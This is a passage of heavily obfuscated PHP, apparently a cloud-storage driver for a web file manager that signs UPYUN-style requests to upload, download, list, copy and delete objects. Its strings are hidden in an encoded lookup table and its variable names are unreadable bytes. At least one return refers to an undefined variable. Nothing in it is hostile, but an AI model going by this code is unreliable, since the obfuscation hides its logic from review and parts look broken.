array("\101\x75\x74\150\x6f\x72\x69\172\141\x74\151\157\x6e\72\x55\x50\131\x55\x4e\40{$this->username}\72{$¹ª“õ¶ }", "\104\x61\x74\145\72{$Ñìœµ¦ñ}"); return $Áğ‚èÃ; } public function ussRequest($½õÅŠî°, $©şÑ šğ = "\107\x45\x54", $ó³ÕÃá¹ = false, $íˆƒËÒÕ = false, $¥™ïşÚ£ = false) { $ğğ°šãÁ =& $_SERVER[¹Éµ„ºå]; $½õÅŠî° = trim($½õÅŠî°, $ğğ°šãÁ[8]); $æÎÚé…² = "\57{$this->bucket}\57" . rawurlencode($½õÅŠî°); $²ÀàğµÊ = $this->ussHeaders($æÎÚé…², $©şÑ šğ); if ($íˆƒËÒÕ) { $²ÀàğµÊ = array_merge($²ÀàğµÊ, $íˆƒËÒÕ); } $ëŸà³À = url_request($this->endpoint . $æÎÚé…², $©şÑ šğ, $ó³ÕÃá¹, $²ÀàğµÊ, $¥™ïşÚ£); if (!$ëŸà³À) { $ğ†ÍÙÔ = LNG($ğğ°šãÁ[1741]); $this->writeLog($ğ†ÍÙÔ); return array($ğğ°šãÁ[1391] => !1, $ğğ°šãÁ[1381] => $ğ†ÍÙÔ); } if (strtolower($©şÑ šğ) == $ğğ°šãÁ[227] || in_array($ëŸà³À[$ğğ°šãÁ[1391]], array($ğğ°šãÁ[261], $ğğ°šãÁ[1742]))) { $ó³ÕÃá¹ = $ëŸà³À[$ğğ°šãÁ[1743]]; if (!$ëŸà³À[$ğğ°šãÁ[841]]) { $ó³ÕÃá¹ = isset($ó³ÕÃá¹[0]) ? $ó³ÕÃá¹[0] : $ğğ°šãÁ[12]; } } else { $ó³ÕÃá¹ = json_decode($ëŸà³À[$ğğ°šãÁ[1381]], !0); if (!$ó³ÕÃá¹) { $ó³ÕÃá¹ = $ëŸà³À[$ğğ°šãÁ[1381]]; } else { if (!$ëŸà³À[$ğğ°šãÁ[841]] && isset($ó³ÕÃá¹[$ğğ°šãÁ[1744]])) { $ó³ÕÃá¹ = $ó³ÕÃá¹[$ğğ°šãÁ[1744]]; } } } if (!$ëŸà³À[$ğğ°šãÁ[841]]) { $this->writeLog($this->__errorMessage($ó³ÕÃá¹)); } return array($ğğ°šãÁ[1391] => $ëŸà³À[$ğğ°šãÁ[841]], $ğğ°šãÁ[1381] => $ó³ÕÃá¹); } private function __errorMessage($ö‘¹‚¥) { $±ƒüğó× =& $_SERVER[¹Éµ„ºå]; if (!$ö‘¹‚¥) { return $±ƒüğó×[12]; } static $ŒéÀí€‹ = null; if (!$ŒéÀí€‹) { $ŒéÀí€‹ = I18n::getType(); } if ($ŒéÀí€‹ != $±ƒüğó×[1699]) { return $ö‘¹‚¥; } $ºïÍ¨Ãó = array($±ƒüğó×[1745] => $±ƒüğó×[1746], $±ƒüğó×[1747] => $±ƒüğó×[1748], $±ƒüğó×[1749] => $±ƒüğó×[1748], $±ƒüğó×[1750] => $±ƒüğó×[1751], $±ƒüğó×[1752] => $±ƒüğó×[1753], $±ƒüğó×[1754] => $±ƒüğó×[1755], $±ƒüğó×[1756] => $±ƒüğó×[1757]); return isset($ºïÍ¨Ãó[$ö‘¹‚¥]) ? $ºïÍ¨Ãó[$ö‘¹‚¥] : $ö‘¹‚¥; } public function mkfile($Ç¤›Ší, $Ê˜úİÃÏ = '', $ûÅ´ÈÅ = REPEAT_RENAME) { if ($this->setContent($Ç¤›Ší, $Ê˜úİÃÏ)) { return $this->getPathOuter($Ç¤›Ší); } return !1; } public function mkdir($Ø»äÜÍÑ, $…°¥©èÚ = REPEAT_SKIP) { $õşªŸéü =& $_SERVER[¹Éµ„ºå]; $ø—„ ­® = trim($Ø»äÜÍÑ, $õşªŸéü[8]); if ($this->_isFolder($ø—„ ­®)) { return $this->getPathOuter($ø—„ ­®); } $äÚ§Ä»› = array($õşªŸéü[1758]); $ÖÔÃ“œ = $this->ussRequest($ø—„ ­®, $õşªŸéü[288], !1, $äÚ§Ä»›); return $ÖÔÃ“œ[$õşªŸéü[1391]] ? $this->getPathOuter($ø—„ ­®) : !1; } public function copyFile($ûÛØ«’’, $¡ººÃ‘) { $úœÃÒª =& $_SERVER[¹Éµ„ºå]; $ãİÒ­€Ã = array($úœÃÒª[1759] . "\x2f{$this->bucket}\x2f{$ûÛØ«’’}", $úœÃÒª[1760]); $Ø½ŸÄ‹ì = $this->ussRequest($¡ººÃ‘, $úœÃÒª[253], !1, $ãİÒ­€Ã); return $Ø½ŸÄ‹ì[$úœÃÒª[1391]] ? !0 : $this->getPathOuter($¡ººÃ‘); } public function moveFile($À‚ä„÷î, $Î´˜¢åê) { $Õ»úÏà =& $_SERVER[¹Éµ„ºå]; $†–¾÷ı› = array($Õ»úÏà[1761] . "\57{$this->bucket}\57{$À‚ä„÷î}", $Õ»úÏà[1760]); $®ãî˜È = $this->ussRequest($Î´˜¢åê, $Õ»úÏà[253], !1, $†–¾÷ı›); return $®ãî˜È[$Õ»úÏà[1391]] ? !0 : $this->getPathOuter($Î´˜¢åê); } public function delFile($Ä»„×ŠĞ) { $½Ø…Ü£Æ =& $_SERVER[¹Éµ„ºå]; $õñïîïü = $this->ussRequest($Ä»„×ŠĞ, $½Ø…Ü£Æ[1762]); return $õñïîïü[$½Ø…Ü£Æ[1391]] ? !0 : !1; } public function delFolder($Ş‚ãÇ¾Œ) { $¥ÔÊ‡óñ =& $_SERVER[¹Éµ„ºå]; if (!$this->exist($Ş‚ãÇ¾Œ)) { return !0; } $this->listItemCache = !1; $ª¿Éƒ™ş = $‹şÍ§‘» = array(); $this->fileList($Ş‚ãÇ¾Œ, $ª¿Éƒ™ş, $‹şÍ§‘», !0); $this->listItemCache = !0; foreach ($‹şÍ§‘» as $èõŞó¦Å) { $©Í°Ì‘ = $this->ussRequest($èõŞó¦Å[$¥ÔÊ‡óñ[32]], $¥ÔÊ‡óñ[1762]); if (!$©Í°Ì‘[$¥ÔÊ‡óñ[1391]]) { return !1; } } usort($ª¿Éƒ™ş, function ($—‡ç‘£›, $™½Âí³ì) { $î¥áŠ¦Ò =& $_SERVER[¹Éµ„ºå]; return substr_count($™½Âí³ì, $î¥áŠ¦Ò[8]) - substr_count($—‡ç‘£›, $î¥áŠ¦Ò[8]); }); foreach ($ª¿Éƒ™ş as $§Éé¼µı) { $©Í°Ì‘ = $this->ussRequest($§Éé¼µı, $¥ÔÊ‡óñ[1762]); if (!$©Í°Ì‘[$¥ÔÊ‡óñ[1391]]) { return !1; } } $©Í°Ì‘ = $this->ussRequest($Ş‚ãÇ¾Œ, $¥ÔÊ‡óñ[1762]); return $©Í°Ì‘[$¥ÔÊ‡óñ[1391]]; } public function rename($ƒŞãì¥Û, $šÌ ÀäÎ) { if ($this->isFile($ƒŞãì¥Û)) { $šÌ ÀäÎ = get_path_father($ƒŞãì¥Û) . $šÌ ÀäÎ; return $this->moveFile($ƒŞãì¥Û, $šÌ ÀäÎ); } return $this->renameObject($ƒŞãì¥Û, $šÌ ÀäÎ); } public function fileInfo($ñª»œæ¹, $§ÄªÇ¢Ğ = false, $Ğı…Ê£§ = array()) { $´­ŞöÎé =& $_SERVER[¹Éµ„ºå]; $ƒù“³ = array($´­ŞöÎé[32] => $this->pathThis($ñª»œæ¹), $´­ŞöÎé[87] => $this->getPathOuter($´­ŞöÎé[8] . $ñª»œæ¹), $´­ŞöÎé[33] => $´­ŞöÎé[230], $´­ŞöÎé[79] => isset($Ğı…Ê£§[$´­ŞöÎé[79]]) ? $Ğı…Ê£§[$´­ŞöÎé[79]] : 0, $´­ŞöÎé[166] => $this->ext($ñª»œæ¹)); if ($§ÄªÇ¢Ğ) { return $ƒù“³; } $ƒù“³[$´­ŞöÎé[231]] = $ƒù“³[$´­ŞöÎé[88]] = 0; $ƒù“³[$´­ŞöÎé[232]] = $ƒù“³[$´­ŞöÎé[233]] = !0; if (empty($Ğı…Ê£§)) { $Ğı…Ê£§ = $this->objectMeta($ñª»œæ¹); if (!$Ğı…Ê£§) { return $ƒù“³; } } $ƒù“³[$´­ŞöÎé[231]] = intval($Ğı…Ê£§[$´­ŞöÎé[1763]]); $ƒù“³[$´­ŞöÎé[88]] = intval($Ğı…Ê£§[$´­ŞöÎé[1764]]); $ƒù“³[$´­ŞöÎé[79]] = $Ğı…Ê£§[$´­ŞöÎé[79]]; return $ƒù“³; } public function folderInfo($ÊŞšú÷, $®ÛçÚ“ = false) { $”Êìó¯ú =& $_SERVER[¹Éµ„ºå]; $¢‹âµ—Ë = array($”Êìó¯ú[32] => $this->pathThis($ÊŞšú÷), $”Êìó¯ú[87] => $this->getPathOuter($”Êìó¯ú[8] . $ÊŞšú÷), $”Êìó¯ú[33] => $”Êìó¯ú[78]); if ($®ÛçÚ“) { return $¢‹âµ—Ë; } $¢‹âµ—Ë[$”Êìó¯ú[231]] = $¢‹âµ—Ë[$”Êìó¯ú[88]] = 0; $¢‹âµ—Ë[$”Êìó¯ú[232]] = $¢‹âµ—Ë[$”Êìó¯ú[233]] = !0; if (empty($è¶ò´•™)) { $è¶ò´•™ = $this->objectMeta($ÊŞšú÷); if (!$è¶ò´•™) { return $¢‹âµ—Ë; } } $¢‹âµ—Ë[$”Êìó¯ú[231]] = intval($è¶ò´•™[$”Êìó¯ú[1763]]); $¢‹âµ—Ë[$”Êìó¯ú[88]] = intval($è¶ò´•™[$”Êìó¯ú[1764]]); return $¢‹âµ—Ë; } private function listObjs($¥¾ä¯Øã, $Œ÷Ô¹çß = 0, $èäÕÏüñ = 1000) { $Àì¹¨æ =& $_SERVER[¹Éµ„ºå]; $‘ïö¸»× = array($Àì¹¨æ[1765], $Àì¹¨æ[1766] . $èäÕÏüñ); if ($Œ÷Ô¹çß) { $‘ïö¸»×[] = $Àì¹¨æ[1767] . $Œ÷Ô¹çß; } $†È´÷¦Æ = $this->ussRequest($¥¾ä¯Øã, $Àì¹¨æ[1595], !1, $‘ïö¸»×); return !$†È´÷¦Æ[$Àì¹¨æ[1391]] ? !1 : $†È´÷¦Æ[$Àì¹¨æ[1381]]; } private function fileList($ò“Ê¹«³, &$ş¥ËËÉ·, &$¦ß®ìæ, $ğ–Ñ¡ˆœ = false) { $¢é½Ğá =& $_SERVER[¹Éµ„ºå]; $¸´Æğê® = $¢é½Ğá[12]; $¶Öİ÷„Æ = 1000; $Ò”¬’ã´ = rtrim($ò“Ê¹«³, $¢é½Ğá[8]) . $¢é½Ğá[8]; while (!0) { check_abort(); $ì½¾¸ËÕ = $this->listObjs($ò“Ê¹«³, $¸´Æğê®, $¶Öİ÷„Æ); if (!$ì½¾¸ËÕ) { return !1; } $¸´Æğê® = isset($ì½¾¸ËÕ[$¢é½Ğá[1768]]) ? $ì½¾¸ËÕ[$¢é½Ğá[1768]] : $¢é½Ğá[12]; $–ôëÒå = isset($ì½¾¸ËÕ[$¢é½Ğá[1769]]) ? $ì½¾¸ËÕ[$¢é½Ğá[1769]] : array(); foreach ($–ôëÒå as $ÊÊÁÓÚ) { $×°¨íø = $ÊÊÁÓÚ[$¢é½Ğá[33]] == $¢é½Ğá[78] ? !0 : !1; $£Š¥ãÉ¤ = ltrim($Ò”¬’ã´ . $ÊÊÁÓÚ[$¢é½Ğá[32]], $¢é½Ğá[8]) . ($×°¨íø ? $¢é½Ğá[8] : $¢é½Ğá[12]); $ú±º¶æô = array($¢é½Ğá[32] => $£Š¥ãÉ¤, $¢é½Ğá[33] => $×°¨íø ? $¢é½Ğá[78] : $¢é½Ğá[230], $¢é½Ğá[79] => $ÊÊÁÓÚ[$¢é½Ğá[412]], $¢é½Ğá[1764] => $ÊÊÁÓÚ[$¢é½Ğá[1770]]); $this->cacheMethodInfoSet($£Š¥ãÉ¤, $×°¨íø, $ú±º¶æô); if ($×°¨íø) { $ş¥ËËÉ·[] = $£Š¥ãÉ¤; if ($ğ–Ñ¡ˆœ) { $this->fileList($£Š¥ãÉ¤, $ş¥ËËÉ·, $¦ß®ìæ, $ğ–Ñ¡ˆœ); } continue; } $¦ß®ìæ[] = $ú±º¶æô; } if (count($–ôëÒå) < $¶Öİ÷„Æ) { break; } } $this->cacheMethodInfoSet($ò“Ê¹«³, !0); } public function listPath($¹Û…î³â, $ÂÑÇ­è§ = false) { $íØÉ—²¯ =& $_SERVER[¹Éµ„ºå]; $şÖó¨¯­ = $‰£ÆÁÂ˜ = array(); $this->fileList($¹Û…î³â, $şÖó¨¯­, $‰£ÆÁÂ˜); foreach ($şÖó¨¯­ as $úÁ¿„¼Â => $œ¯ËƒŞ¥) { $şÖó¨¯­[$úÁ¿„¼Â] = $this->folderInfo($œ¯ËƒŞ¥, $ÂÑÇ­è§); } foreach ($‰£ÆÁÂ˜ as $úÁ¿„¼Â => $œ¯ËƒŞ¥) { $‰£ÆÁÂ˜[$úÁ¿„¼Â] = $this->fileInfo($œ¯ËƒŞ¥[$íØÉ—²¯[32]], $ÂÑÇ­è§, $œ¯ËƒŞ¥); } return array($íØÉ—²¯[85] => $şÖó¨¯­, $íØÉ—²¯[86] => $‰£ÆÁÂ˜); } public function has($±çöŠñÄ, $çµÈÕ  = false, $ŞÒüöª– = true) { $ôú‚¶Ğş =& $_SERVER[¹Éµ„ºå]; $È¹íïŒ  = $ôú‚¶Ğş[12]; $ŞÔïñü’ = 500; $ÏŒÏí€ = 0; $»ñğ¿œé = 0; $ÔâÈé¦ú = rtrim($±çöŠñÄ, $ôú‚¶Ğş[8]) . $ôú‚¶Ğş[8]; while (!0) { check_abort(); $¤ü¶šÖš = $this->listObjs($±çöŠñÄ, $È¹íïŒ , $ŞÔïñü’); if (!$¤ü¶šÖš) { return !1; } $È¹íïŒ  = isset($¤ü¶šÖš[$ôú‚¶Ğş[1768]]) ? $¤ü¶šÖš[$ôú‚¶Ğş[1768]] : $ôú‚¶Ğş[12]; $”Ã€Í“Ü = isset($¤ü¶šÖš[$ôú‚¶Ğş[1769]]) ? $¤ü¶šÖš[$ôú‚¶Ğş[1769]] : array(); if (empty($”Ã€Í“Ü)) { break; } $áèŸÖí = array_filter($”Ã€Í“Ü, function ($ÎÄİæè) { $†íçóËò =& $_SERVER[¹Éµ„ºå]; return $ÎÄİæè[$†íçóËò[33]] == $†íçóËò[78]; }); $ùƒæñ¢ = count($”Ã€Í“Ü); $áèŸÖí = count($áèŸÖí); $ÓÓò±ô = $ùƒæñ¢ - $áèŸÖí; if ($çµÈÕ ) { $»ñğ¿œé += $áèŸÖí; $ÏŒÏí€ += $ÓÓò±ô; if ($ùƒæñ¢ < $ŞÔïñü’) { break; } continue; } if ($ŞÒüöª–) { if ($ÓÓò±ô) { return !0; } } else { if ($áèŸÖí) { return !0; } } if ($ùƒæñ¢ < $ŞÔïñü’) { break; } } if ($çµÈÕ ) { return array($ôú‚¶Ğş[239] => $ÏŒÏí€, $ôú‚¶Ğş[240] => $»ñğ¿œé); } return !1; } public function listAll($œÔì»õâ) { $™¸‹Ï =& $_SERVER[¹Éµ„ºå]; $ˆ…À”ºÆ = $£áş¯ş“ = array(); $this->fileList($œÔì»õâ, $ˆ…À”ºÆ, $£áş¯ş“, !0); $å©ÆÔŒÃ = array_to_keyvalue($£áş¯ş“, $™¸‹Ï[32]); foreach ($ˆ…À”ºÆ as $³§ÖÎ) { if (is_string($³§ÖÎ)) { $å©ÆÔŒÃ[$³§ÖÎ] = array($™¸‹Ï[79] => 0); } } return $this->listAllFiles($œÔì»õâ, $å©ÆÔŒÃ); } public function canRead($Òëº“Œö) { return $this->exist($Òëº“Œö) ? !0 : !1; } public function canWrite($á­À¦ùî) { return $this->exist($á­À¦ùî) ? !0 : !1; } public function getContent($¿ûšº˜) { return $this->fileSubstr($¿ûšº˜, 0, -1); } public function setContent($°ŒòÇ†µ, $–§ÁÆ¤Ö = '') { $­«½Ñ’ò =& $_SERVER[¹Éµ„ºå]; if (!$–§ÁÆ¤Ö) { $íé£éíú = $this->ussRequest($°ŒòÇ†µ, $­«½Ñ’ò[288]); return $íé£éíú[$­«½Ñ’ò[1391]]; } $‡Ã¾Š†ù = $this->tempFile($this->pathThis($°ŒòÇ†µ)); file_put_contents($‡Ã¾Š†ù, $–§ÁÆ¤Ö); if ($this->upload($°ŒòÇ†µ, $‡Ã¾Š†ù)) { $this->tempFileRemve($‡Ã¾Š†ù); return !0; } return !1; } public function fileSubstr($Æøê†âÚ, $¶ªîòå˜, $˜¤Ş‹ç) { $ˆÏ‹À‡· =& $_SERVER[¹Éµ„ºå]; if (!($ÌåÂõâ = $this->link($Æøê†âÚ))) { return !1; } $Èæ·Î– = !1; if ($˜¤Ş‹ç > 0) { $¼×ö£ú = $¶ªîòå˜ + $˜¤Ş‹ç - 1; $Èæ·Î– = array($ˆÏ‹À‡·[1594] . $¶ªîòå˜ . $ˆÏ‹À‡·[476] . $¼×ö£ú); } $”š¼¨ñ = url_request($ÌåÂõâ, $ˆÏ‹À‡·[1595], !1, $Èæ·Î–); return $”š¼¨ñ[$ˆÏ‹À‡·[841]] ? $”š¼¨ñ[$ˆÏ‹À‡·[1381]] : !1; } public function upload($òÑ‰ Ë¹, $¿©ˆ¡ÀÊ, $î¡Ïİö = false, $¿¦ÅÑœœ = REPEAT_REPLACE) { $¦Û±ÁƒÚ =& $_SERVER[¹Éµ„ºå]; if (!$¿©ˆ¡ÀÊ || !@file_exists($¿©ˆ¡ÀÊ)) { return !1; } $™‰Ô™¬ş = IO::size($¿©ˆ¡ÀÊ); if ($™‰Ô™¬ş <= 1024 * 1024 * 200) { $Ÿ¾­Àş  = array($¦Û±ÁƒÚ[1771] . $¿©ˆ¡ÀÊ); $šƒ„ö¦ = $this->ussRequest($òÑ‰ Ë¹, $¦Û±ÁƒÚ[253], $Ÿ¾­Àş ); return $šƒ„ö¦[$¦Û±ÁƒÚ[1391]] ? $this->getPathOuter($òÑ‰ Ë¹) : !1; } $ü¦³ÉŒ = 1024 * 1024 * 10; $ü÷íÃÏ‡ = array($¦Û±ÁƒÚ[1772], $¦Û±ÁƒÚ[1773] . $™‰Ô™¬ş, $¦Û±ÁƒÚ[1774], $¦Û±ÁƒÚ[1775] . $ü¦³ÉŒ); $šƒ„ö¦ = $this->ussRequest($òÑ‰ Ë¹, $¦Û±ÁƒÚ[253], !1, $ü÷íÃÏ‡); if (!$šƒ„ö¦[$¦Û±ÁƒÚ[1391]]) { return !1; } $ôÑÍÊ¿² = $šƒ„ö¦[$¦Û±ÁƒÚ[1381]]; $ÒÔæ…«­ = 0; $â‹Ï“«Ş = $ôÑÍÊ¿²[$¦Û±ÁƒÚ[1776]]; $ñ·¤«ø¡ = fopen($¿©ˆ¡ÀÊ, $¦Û±ÁƒÚ[1656]); if (!$ñ·¤«ø¡) { return !1; } do { $‘–ø»æ = $ôÑÍÊ¿²[$¦Û±ÁƒÚ[1777]]; fseek_64($ñ·¤«ø¡, $ÒÔæ…«­); $îùãÛë = fread($ñ·¤«ø¡, $‘–ø»æ); $ÛŞº‹ú’ = 0; do { $ÛŞº‹ú’++; $ôÑÍÊ¿² = $this->uploadPart($òÑ‰ Ë¹, $ôÑÍÊ¿², $îùãÛë); } while (!$ôÑÍÊ¿² && $ÛŞº‹ú’ < 3); if (!$ôÑÍÊ¿²) { return !1; } $â‹Ï“«Ş = $ôÑÍÊ¿²[$¦Û±ÁƒÚ[1776]]; $ÒÔæ…«­ += $‘–ø»æ; } while ($â‹Ï“«Ş != -1); fclose($ñ·¤«ø¡); $ü÷íÃÏ‡ = array($¦Û±ÁƒÚ[1778], $¦Û±ÁƒÚ[1779] . $ôÑÍÊ¿²[$¦Û±ÁƒÚ[1780]], $¦Û±ÁƒÚ[1774]); $šƒ„ö¦ = $this->ussRequest($òÑ‰ Ë¹, $¦Û±ÁƒÚ[253], !1, $ü÷íÃÏ‡); return $šƒ„ö¦[$¦Û±ÁƒÚ[1391]] ? $this->getPathOuter($Çî¯‹ö§) : !1; } private function uploadPart($½òâˆš, $×˜Šï, &$•Êš¡­) { $ç¾ûª´˜ =& $_SERVER[¹Éµ„ºå]; $¾áËò   = array($ç¾ûª´˜[1781], $ç¾ûª´˜[1779] . $×˜Šï[$ç¾ûª´˜[1780]], $ç¾ûª´˜[1782] . $×˜Šï[$ç¾ûª´˜[1776]], $ç¾ûª´˜[143] . $×˜Šï[$ç¾ûª´˜[1777]]); $ÓÈÙş¦ø = $this->ussRequest($½òâˆš, $ç¾ûª´˜[253], $•Êš¡­, $¾áËò  ); return !$ÓÈÙş¦ø[$ç¾ûª´˜[1391]] ? $ÓÈÙş¦ø[$ç¾ûª´˜[1391]] : $ÓÈÙş¦ø[$ç¾ûª´˜[1381]]; } public function uploadFormData($´¡“ù¥Ù, $—ø×—ıà = 3600) { return $this->uploadPolicy($´¡“ù¥Ù, $—ø×—ıà); } public function uploadMultiData($’Â”·…«, $¾Ø½ç©÷ = 3600) { $º«Å–»¬ =& $_SERVER[¹Éµ„ºå]; $¾âŒ¯­‘ = (int) $GLOBALS[$º«Å–»¬[7]][$º«Å–»¬[79]]; return $this->uploadPolicy($’Â”·…«, $¾Ø½ç©÷, $¾âŒ¯­‘); } private function uploadPolicy($ıÃïÁìÙ, $—µúÜ´ = 3600, $ã¬Ì´şü = 0) { $ı…©ûÒ¿ =& $_SERVER[¹Éµ„ºå]; $È×†‰Ó™ = $ı…©ûÒ¿[8] . $this->bucket; $¥ô’®í = gmdate($ı…©ûÒ¿[1691]); $ÈœÆÇò± = array($ı…©ûÒ¿[1783] => $this->bucket, $ı…©ûÒ¿[1784] => $ıÃïÁìÙ, $ı…©ûÒ¿[1785] => time() + $—µúÜ´, $ı…©ûÒ¿[1786] => $¥ô’®í); if ($ã¬Ì´şü) { $ÈœÆÇò±[$ı…©ûÒ¿[1676]] = $ã¬Ì´şü; } $ÂÍ—Ùóƒ = base64_encode(json_encode($ÈœÆÇò±)); $àîÇ…Ö‡ = base64_encode(hash_hmac($ı…©ûÒ¿[1740], "\x50\117\123\124\x26{$È×†‰Ó™}\x26{$¥ô’®í}\x26{$ÂÍ—Ùóƒ}", md5("{$this->userpass}"), !0)); $Óèï°ÚØ = array($ı…©ûÒ¿[277] => $ÂÍ—Ùóƒ, $ı…©ûÒ¿[1787] => "\x55\120\x59\x55\x4e\40{$this->username}\x3a{$àîÇ…Ö‡}", $ı…©ûÒ¿[206] => $this->endpoint . $È×†‰Ó™); return $Óèï°ÚØ; } public function download($•ºÎ¼Îñ, $¸´Şı) { $úø¦º— = IO::getPathInner(IO::mkfile($¸´Şı)); if (!($Š¼÷­Šë = $this->link($•ºÎ¼Îñ))) { return !1; } $ä¯‰‡ = 0; $ÎĞŒ¥ = 1024 * 200; $ÚñúÎ¢ë = fopen($úø¦º—, $_SERVER[¹Éµ„ºå][1735]); while (!0) { $¹§½ÇÙÃ = $this->fileSubstr($•ºÎ¼Îñ, $ä¯‰‡, $ÎĞŒ¥); if ($¹§½ÇÙÃ === !1) { return !1; } fwrite($ÚñúÎ¢ë, $¹§½ÇÙÃ); $ä¯‰‡ += $ÎĞŒ¥; if (strlen($¹§½ÇÙÃ) < $ÎĞŒ¥) { break; } } fclose($ÚñúÎ¢ë); return $¸´Şı; } public function link($Í²óıßã, $—˜’ë… = array()) { $Àˆ®›¿ =& $_SERVER[¹Éµ„ºå]; $Í²óıßã = trim($Í²óıßã, $Àˆ®›¿[8]); if (!empty($this->token)) { $í­Ô¼½ò = strtotime(date($Àˆ®›¿[1788])); $Şìß’”ú = substr(md5($this->token . $Àˆ®›¿[284] . $í­Ô¼½ò . $Àˆ®›¿[1789] . $Í²óıßã), 12, 8) . $í­Ô¼½ò; $—˜’ë…[] = $Àˆ®›¿[1790] . $Şìß’”ú; } $´¥ÁêÆÓ = !empty($—˜’ë…) ? $Àˆ®›¿[76] . implode($Àˆ®›¿[284], $—˜’ë…) : $Àˆ®›¿[12]; return $this->getHost() . $Àˆ®›¿[8] . $this->pathEncode($Í²óıßã) . $´¥ÁêÆÓ; } public function fileOut($×“‹È£, $Ö§àıó” = false, $—¢¸ÜÂÉ = false, $ûœ›ìˆß = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($×“‹È£, $Ö§àıó”, $—¢¸ÜÂÉ, $ûœ›ìˆß); } if (!$—¢¸ÜÂÉ) { $—¢¸ÜÂÉ = $this->pathThis($×“‹È£); } $ø³ÙĞÎ” = $Ö§àıó” ? array($_SERVER[¹Éµ„ºå][1791] . rawurlencode($—¢¸ÜÂÉ)) : array(); $©úûÊÔ¦ = $this->link($×“‹È£, $ø³ÙĞÎ”); $this->fileOutLink($©úûÊÔ¦); } public function fileOutServer($€èÑ´ö, $¬·ãÛ¯ = false, $²»÷ÒßŸ = false, $ûá®Óì´ = '') { parent::fileOut($€èÑ´ö, $¬·ãÛ¯, $²»÷ÒßŸ, $ûá®Óì´); } public function fileOutImage($Ò”¸Ä¼–, $ãƒ‡‘“ = 250) { $¶Ì±÷Æ = $this->link($Ò”¸Ä¼– . $_SERVER[¹Éµ„ºå][1792] . $ãƒ‡‘“); $this->fileOutLink($¶Ì±÷Æ); } public function fileOutImageServer($Ü—š€¤œ, $Ù°°ùúü = 250) { parent::fileOutImage($Ü—š€¤œ, $Ù°°ùúü); } public function hashMd5($¯µÈÔõÄ) { $ùûàïñ =& $_SERVER[¹Éµ„ºå]; $™äÕ¸©’ = $this->_objectMeta($¯µÈÔõÄ); return isset($™äÕ¸©’[$ùûàïñ[245]]) ? $™äÕ¸©’[$ùûàïñ[245]] : !1; } public function size($Üîæ¶Î) { $¢ÒûÛƒ = $this->objectMeta($Üîæ¶Î); return $¢ÒûÛƒ ? $¢ÒûÛƒ[$_SERVER[¹Éµ„ºå][79]] : 0; } public function info($äúËô¬) { if ($this->isFolder($äúËô¬)) { return $this->folderInfo($äúËô¬); } else { if ($this->isFile($äúËô¬)) { return $this->fileInfo($äúËô¬); } } return !1; } public function exist($µĞöÎµ) { return $this->isFile($µĞöÎµ) || $this->isFolder($µĞöÎµ); } public function isFile($û¥ÉñêŸ) { return !$this->isFolder($û¥ÉñêŸ) && $this->objectMeta($û¥ÉñêŸ); } public function isFolder($¼‹®Éİó) { return $this->cacheMethod($_SERVER[¹Éµ„ºå][177], $¼‹®Éİó); } protected function objectMeta($‚Ğ€£™ù) { return $this->cacheMethod($_SERVER[¹Éµ„ºå][179], $‚Ğ€£™ù); } protected function _objectMeta($¯©ò£ı) { $Ìá›ÖÄ =& $_SERVER[¹Éµ„ºå]; if ($¯©ò£ı == $Ìá›ÖÄ[12] || $¯©ò£ı == $Ìá›ÖÄ[8]) { return array(); } $ÛûÇ‡Ù¾ = $this->ussRequest($¯©ò£ı, $Ìá›ÖÄ[1793]); if (!$ÛûÇ‡Ù¾[$Ìá›ÖÄ[1391]]) { return null; } $£®ŸšÃæ = isset($ÛûÇ‡Ù¾[$Ìá›ÖÄ[1381]]) ? $ÛûÇ‡Ù¾[$Ìá›ÖÄ[1381]] : array(); if (!isset($£®ŸšÃæ[$Ìá›ÖÄ[1794]])) { return null; } $Ø“›´ê = array($Ìá›ÖÄ[33] => isset($£®ŸšÃæ[$Ìá›ÖÄ[1794]]) ? $£®ŸšÃæ[$Ìá›ÖÄ[1794]] : null, $Ìá›ÖÄ[79] => isset($£®ŸšÃæ[$Ìá›ÖÄ[1795]]) ? $£®ŸšÃæ[$Ìá›ÖÄ[1795]] : null, $Ìá›ÖÄ[245] => isset($£®ŸšÃæ[$Ìá›ÖÄ[1796]]) ? $£®ŸšÃæ[$Ìá›ÖÄ[1796]] : null, $Ìá›ÖÄ[1763] => isset($£®ŸšÃæ[$Ìá›ÖÄ[1797]]) ? $£®ŸšÃæ[$Ìá›ÖÄ[1797]] : null); $Ø“›´ê[$Ìá›ÖÄ[1764]] = isset($£®ŸšÃæ[$Ìá›ÖÄ[1798]]) ? strtotime($£®ŸšÃæ[$Ìá›ÖÄ[1798]]) : $Ø“›´ê[$Ìá›ÖÄ[1763]]; return $Ø“›´ê; } protected function _isFolder($†Œ¶ôê†) { $ŸÓ‹¾û =& $_SERVER[¹Éµ„ºå]; if ($†Œ¶ôê† == $ŸÓ‹¾û[12] || $†Œ¶ôê† == $ŸÓ‹¾û[8]) { return !0; } $­ôĞ­Ô© = $this->_objectMeta($†Œ¶ôê†); return isset($­ôĞ­Ô©[$ŸÓ‹¾û[33]]) && $­ôĞ­Ô©[$ŸÓ‹¾û[33]] == $ŸÓ‹¾û[78] ? !0 : !1; } } goto b†Ò„á±çÈ; AÜ†­î‰¹™: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ÌÅ´ØÒû) { $ûşµŞú =& $_SERVER[¹Éµ„ºå]; if (!$this->allowLock()) { return; } $this->_lockCheck($ûşµŞú[641], $ÌÅ´ØÒû); $×—‡¥³ = 1; $this->_lockEvent($ÌÅ´ØÒû, array($ûşµŞú[642], $ûşµŞú[643]), $×—‡¥³); $this->_lockParent($ÌÅ´ØÒû, array($ûşµŞú[643]), $×—‡¥³); $this->_lockEvent($ÌÅ´ØÒû, array($ûşµŞú[644], $ûşµŞú[645]), $×—‡¥³); $this->_lockCheckEnd($ûşµŞú[641], $ÌÅ´ØÒû); } public function lockCopyEnd($ÌÌ’˜ë) { $´î€×à„ =& $_SERVER[¹Éµ„ºå]; if (!$this->allowLock()) { return; } $†Ô°³§¿ = 0; $this->_lockEvent($ÌÌ’˜ë, array($´î€×à„[642], $´î€×à„[643]), $†Ô°³§¿); $this->_lockParent($ÌÌ’˜ë, array($´î€×à„[643]), $†Ô°³§¿); $this->_lockEvent($ÌÌ’˜ë, array($´î€×à„[644], $´î€×à„[645]), $†Ô°³§¿); } public function lockWriteStart($¡©²®ªĞ, $´¶ö¨ù† = '') { $Œ·÷Úˆ =& $_SERVER[¹Éµ„ºå]; if 